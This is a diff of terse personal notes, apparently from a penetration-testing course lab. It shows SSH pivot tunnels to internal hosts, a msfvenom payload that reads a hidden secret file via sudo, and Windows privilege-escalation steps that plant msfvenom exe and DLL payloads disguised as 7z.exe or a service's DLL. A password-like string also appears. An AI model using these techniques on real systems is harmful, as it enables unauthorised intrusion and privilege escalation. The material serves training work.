@@ -2,6 +2,7 @@ KEPE-006-M
 jTlU99dknad4D95
 
 Tunnels
+exit
 ssh -MS /tmp/gray student@10.50.46.234
 ssh -S /tmp/gray gray -O forward -D9050
 ssh -S /tmp/gray 10 -O forward -L 1700:192.168.28.27:22
@@ -45,3 +46,19 @@ sudo -l (list user permissions)
 find /var/log -type f -mmin -10 2> /dev/null
 
 msfvenom -p linux/x86/exec CMD="sudo cat /.secret/.verysecret.pdb" -b '\x00' -f python
+
+
+
+
+Windows Exploitation
+Services
+check path
+file explorer
+
+msfvenom -p windows/exec CMD='cmd.exe /c "whoami" > C:\Users\UNAME\Desktop\whoami.txt' -f exe > 7z.exe
+scp
+task scheduler
+find task run by system try and try and edit/create files within the directory
+view hidden files
+
+msfvenom -p windows/exec CMD='cmd.exe /c "whoami" > C:\Users\UNAME\Desktio\dll.dll' -f dll > name of dll its calling for
